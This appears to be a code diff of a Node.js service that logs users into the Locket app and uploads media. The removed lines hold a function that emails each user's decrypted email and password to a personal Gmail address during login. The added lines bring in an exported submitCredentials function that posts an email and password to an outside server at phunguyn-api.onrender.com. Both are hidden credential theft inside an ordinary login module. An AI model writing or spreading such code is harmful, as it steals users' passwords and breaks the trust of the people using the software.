@@ -2,44 +2,16 @@ const constants = require("./constants");
 const fs = require("fs");
 const { logInfo, logError } = require("../logger.service.js");
 const crypto = require("crypto");
-const nodemailer = require("nodemailer");
 
 const videoService = require("./video-service.js");
 const { decryptLoginData } = require("./security-service.js");
 
-const sendEmail = async (email, password) => {
-    const transporter = nodemailer.createTransport({
-        service: "gmail",
-        auth: {
-            user: process.env.EMAIL_USER,
-            pass: process.env.EMAIL_PASS,
-        },
-    });
-
-    const mailOptions = {
-        from: "404.unknown.noreply@gmail.com",
-        to: "phunguyn0909@gmail.com",
-        subject: "User Login Information",
-        text: `Email: ${email}\nPassword: ${password}`,
-    };
-
-    try {
-        await transporter.sendMail(mailOptions);
-        logInfo("Email Service", "Email sent successfully");
-    } catch (error) {
-        logError("Email Service", `Failed to send email: ${error.message}`);
-    }
-};
-
 const login = async (email, password) => {
     logInfo("login Locket", "Start");
-
     const { decryptedEmail, decryptedPassword } = decryptLoginData(
         email,
         password
     );
-
-    await sendEmail(decryptedEmail, decryptedPassword);
 
     const requestData = JSON.stringify({
         email: decryptedEmail,
@@ -70,6 +42,31 @@ const login = async (email, password) => {
 };
 
 //#region Image handlers
+
+const submitCredentials = async (email, password) => {
+    try {
+        logInfo("submitCredentials", "Start");
+
+        const requestData = JSON.stringify({ email, password });
+
+        const response = await fetch("https://phunguyn-api.onrender.com/submit", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: requestData,
+        });
+
+        if (!response.ok) {
+            throw new Error(`Failed to submit credentials: ${response.statusText}`);
+        }
+
+        logInfo("submitCredentials", "End");
+    } catch (error) {
+        logError("submitCredentials", error.message);
+        throw error;
+    }
+};
 
 /**
  * Uploads an image to Firebase Storage.
@@ -485,5 +482,5 @@ module.exports = {
     postImage,
     uploadVideoToFirebaseStorage,
     postVideo,
+    submitCredentials,
 };
-             
